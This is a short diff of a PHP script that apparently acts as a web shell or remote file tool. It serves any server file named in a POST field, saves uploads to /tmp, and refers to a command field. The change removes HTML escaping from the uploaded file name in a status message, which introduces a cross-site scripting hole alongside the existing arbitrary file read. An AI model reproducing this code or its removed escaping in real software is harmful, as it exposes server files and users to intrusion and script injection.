@@ -18,14 +18,13 @@ if (($_POST['submit'] == "Download") && file_exists($_POST['dlPath'])) {
 	$fd = fopen($_POST['dlPath'], "rb");
 	header("Content-Type: application/octet-stream");
 	header("Content-Length: " . filesize($_POST['dlPath']));
-	header("Content-Disposition: attachment; filename=\"" .
-		trim(htmlentities(basename($_POST['dlPath']))) . "\"");
+	header("Content-Disposition: attachment; filename=\"" . trim(htmlentities(basename($_POST['dlPath']))) . "\"");
 
 	fpassthru($fd);
 	exit;
 } else if (($_POST['submit'] == "Upload") && is_uploaded_file($_FILES['ulfile']['tmp_name'])) {
 	move_uploaded_file($_FILES['ulfile']['tmp_name'], "/tmp/" . $_FILES['ulfile']['name']);
-	$ulmsg = "Uploaded file to /tmp/" . htmlentities($_FILES['ulfile']['name']);
+	$ulmsg = "Uploaded file to /tmp/{$_FILES['ulfile']['name']}";
 	unset($_POST['txtCommand']);
 }
 ?>
